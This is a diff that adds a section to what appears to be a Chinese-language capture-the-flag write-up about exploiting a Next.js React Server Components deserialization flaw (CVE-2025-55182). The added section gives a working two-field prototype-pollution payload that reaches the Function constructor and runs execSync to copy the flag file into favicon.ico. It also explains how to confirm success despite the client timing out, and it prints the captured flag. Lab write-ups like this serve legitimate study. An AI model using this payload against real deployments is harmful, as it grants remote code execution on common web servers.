@@ -69,3 +69,31 @@ _chunks = $2:_response:_chunks，_bundlerConfig = {}）
   -> _prefix = writeFileSync('/app/web/public/favicon.ico', execSync('cat /challenge/flag.txt'))
   -> GET /favicon.ico
 ```
+
+---
+
+## 补充：2026-10-27 本轮的最短 payload
+
+### 2 字段即可执行，不需要字段 2
+
+上一轮记录里要用 6 字段（`_prefix` 在字段 5）或 3 字段。本轮直接使用 CVE-2025-55182 的公开形状：
+
+```text
+字段 0：{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,
+        "value":"{\"then\":\"$B1337\"}",
+        "_response":{"_prefix":"<JS>","_formData":{"get":"$1:constructor:constructor"}}}
+字段 1："$@0"
+```
+
+`_prefix` 里执行 `process.mainModule.require('child_process').execSync('cp /challenge/flag.txt /app/web/public/favicon.ico')`。
+
+### 客户端超时是正常现象
+
+`execSync` 在请求处理路径里同步执行，客户端会一直等不到响应；本轮 `urllib` 直接
+`TimeoutError`。不能用「有没有响应」判断是否执行，改用副作用验证：写
+`/app/web/public/favicon.ico` 后 `GET /favicon.ico`，正文就是 flag。
+
+**判据**：请求超时 + `favicon.ico` 变成 flag → 执行成功。若写 `/app/web/public/z9k.txt`
+再取回，会得到 Next.js 的 SPA 首页 HTML（软 404），不能用来判成功。
+
+本次 favicon 取回 `flag{4c604dff-65c8-477d-845d-a8b3d14e7b8b}`，平台接受。
